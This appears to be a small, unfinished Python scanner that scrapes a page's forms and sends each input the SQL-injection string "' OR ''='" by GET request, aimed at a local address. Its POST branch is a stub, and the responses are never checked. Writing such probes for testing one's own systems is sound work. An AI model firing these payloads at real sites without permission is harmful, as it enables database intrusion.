# -- coding: utf-8 --
from bs4 import BeautifulSoup
import requests
import re

errors = [
    "' OR ''='",
    "query"
]

s = requests.Session()

def get(url):
    page = s.get(url)
    soup = BeautifulSoup(page.text, "html.parser")
    for forms in soup.select('form'):

        for inputs in soup.select('input'):

            if str(forms['method']).lower() == "get":
                print("[SQL] >> GET REQUEST - " + str(forms['action'] + "?" + str(inputs['name']) + "=" + errors[1]))

                # Checks if action is the base URL.
                if str(forms['action']).startswith("http://") or str(forms['action']).startswith("https://"):
                    for error in errors:
                        r = s.get(str(forms['action'] + "?" + str(inputs['name']) + "=" + error))
                        output = BeautifulSoup(r.text, "html.parser")
                else:
                    for error in errors:
                        r = s.get(url + str(forms['action'] + "?" + str(inputs['name']) + "=" + error))
                        output = BeautifulSoup(r.text, "html.parser")

            elif str(forms['method']).lower() == "post":
                print("POST")
                #s.post(str(forms['action']), data=formdata)

            else:
                print("[SQL] >> Method for Form: " + str(forms['id']) + " could not be found?")
        

get("http://0.0.0.0:6779")